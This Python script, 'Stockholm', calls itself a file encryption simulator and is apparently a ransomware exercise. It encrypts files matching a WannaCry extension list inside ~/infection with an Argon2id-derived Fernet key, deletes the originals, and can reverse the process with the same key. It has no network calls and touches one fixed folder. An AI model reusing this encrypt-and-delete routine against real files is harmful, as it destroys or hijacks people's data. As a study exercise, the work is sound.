#!/usr/bin/env python3

import argparse
import sys
import os
import base64
from pathlib import Path
from argon2.low_level import hash_secret_raw, Type
from cryptography.fernet import Fernet, InvalidToken

VERSION = "1.0.0"
MAGIC = b"STK1"
SALT_SIZE = 16
TARGET_DIR = Path.home() / "infection"
WANNA_CRY_EXTENSIONS = {
    '.123', '.3dm', '.3ds', '.3g2', '.3gp', '.602', '.7z', '.accdb', '.aes', '.ai', '.arc',
    '.asc', '.asf', '.asm', '.asp', '.avi', '.backup', '.bak', '.bat', '.bmp', '.brd', '.bz2',
    '.c', '.cgm', '.class', '.cmd', '.cpp', '.crt', '.cs', '.csr', '.csv', '.db', '.dbf', '.dch',
    '.der', '.dif', '.dip', '.djvu', '.doc', '.docb', '.docm', '.docx', '.dot', '.dotm', '.dotx',
    '.dwg', '.edb', '.eml', '.fla', '.flv', '.frm', '.gif', '.gpg', '.gz', '.h', '.htm', '.html',
    '.hwp', '.ibd', '.iqy', '.iso', '.jar', '.java', '.jpeg', '.jpg', '.js', '.jsp', '.key', '.lay',
    '.lay6', '.ldf', '.lnk', '.max', '.mdf', '.mdb', '.mkv', '.mml', '.mov', '.mp3', '.mp4', '.mpeg',
    '.mpg', '.msg', '.myd', '.myi', '.nef', '.odb', '.odg', '.odp', '.ods', '.odt', '.onetoc2', '.ost',
    '.otg', '.otp', '.ots', '.ott', '.paq', '.pas', '.pdf', '.pem', '.pfx', '.php', '.pl', '.png', '.pot',
    '.potm', '.potx', '.ppam', '.pps', '.ppsm', '.ppsx', '.ppt', '.pptm', '.pptx', '.ps1', '.psd', '.pst',
    '.p12', '.rar', '.raw', '.rb', '.rtf', '.sch', '.sh', '.slk', '.sln', '.snt', '.sql', '.sqlite3',
    '.sqlitedb', '.sldm', '.sldx', '.suo', '.sxc', '.sxd', '.sxm', '.sxw', '.sxi', '.svg', '.stw', '.sxd',
    '.sxi', '.tar', '.tbk', '.tgz', '.tif', '.tiff', '.txt', '.uot', '.uop', '.vb', '.vbs', '.vcd', '.vdi',
    '.vmdk', '.vmx', '.vob', '.vsd', '.vsdx', '.wav', '.wb2', '.wk1', '.wks', '.wma', '.wmv', '.wps', '.xla',
    '.xlc', '.xlm', '.xls', '.xlsb', '.xlsm', '.xlsx', '.xlt', '.xltm', '.xltx', '.xlw', '.xml', '.zip'
}

def log(message, silent):
    if not silent:
        print(message)
        
def error_exit(message):
    print(f"Error: {message}")
    sys.exit(1)
        
def iter_files(root, reverse):
    for path in root.iterdir():
        if not path.is_file() or path.is_symlink():
            continue
        if reverse:
            if path.name.endswith(".ft"):
                yield path
        else:
            ext = path.suffix.lower()
            if ext in WANNA_CRY_EXTENSIONS:
                yield path
                
def derive_key(password, salt) -> bytes:
    raw = hash_secret_raw(
        secret=password.encode("utf-8"),
        salt=salt,
        time_cost=2,
        memory_cost=19456,  # 19 MB
        parallelism=1,
        hash_len=32,
        type=Type.ID  # Argon2id
    )
    return base64.urlsafe_b64encode(raw)

def encrypt_file(filepath, password, silent):
    salt = os.urandom(SALT_SIZE)
    key = derive_key(password, salt)
    fernet = Fernet(key)
    
    data = filepath.read_bytes()
    encrypted = fernet.encrypt(data)
    
    payload = MAGIC + salt + encrypted
    encrypted_path = filepath.with_name(filepath.name + ".ft")
    encrypted_path.write_bytes(payload)
    filepath.unlink()
    
    log(f"Encrypted: {filepath.name}", silent)

def decrypt_file(filepath, password, silent):
    blob = filepath.read_bytes()

    if len(blob) < len(MAGIC) + SALT_SIZE:
        raise ValueError("file too short")
    
    if blob[:len(MAGIC)] != MAGIC:
        raise ValueError("invalid file format")
    
    salt = blob[len(MAGIC):len(MAGIC) + SALT_SIZE]
    encrypted = blob[len(MAGIC) + SALT_SIZE:]

    key = derive_key(password, salt)
    fernet = Fernet(key)

    try:
        data = fernet.decrypt(encrypted)
    except InvalidToken as exc:
        raise ValueError("wrong key or corrupted file") from exc

    restored_name = filepath.name[:-3]
    original_path = filepath.with_name(restored_name)
    original_path.write_bytes(data)
    filepath.unlink()

    log(f"Decrypted: {restored_name}", silent)

def process_files(args):
    reverse_mode = args.reverse is not None
    key_str = args.reverse if args.reverse else args.key
        
    if not key_str or len(key_str) < 16:
        error_exit("Key must be at least 16 characters.")
    
    for filepath in iter_files(TARGET_DIR, reverse_mode):
        try:
            if reverse_mode:
                decrypt_file(filepath, key_str, args.silent)
            else:
                encrypt_file(filepath, key_str, args.silent)
        except Exception as exc:
            log(f"Error processing {filepath.name}: {exc}", args.silent)

def parse_arguments():
    parser = argparse.ArgumentParser(description="Stockholm: File encryption simulator")
    parser.add_argument("-v", "--version", action="store_true", help="show version")
    parser.add_argument("-r", "--reverse", metavar="<key>", help="reverse using key")
    parser.add_argument("-s", "--silent", action="store_true", help="suppress output")
    parser.add_argument("key", nargs="?", help="encryption key in forward mode")
    return parser.parse_args()

def main():
    args = parse_arguments()
    
    if args.version:
        print(f"Stockholm: version {VERSION}")
        return
    
    if args.reverse and args.key:
        error_exit("Cannot specify both decrypt key and encrypt key.")
        
    if not TARGET_DIR.is_dir():
        error_exit(f"{TARGET_DIR} is not a directory or does not exist. Please run 'make' to set up.")
    
    process_files(args)

if __name__ == "__main__":
    main()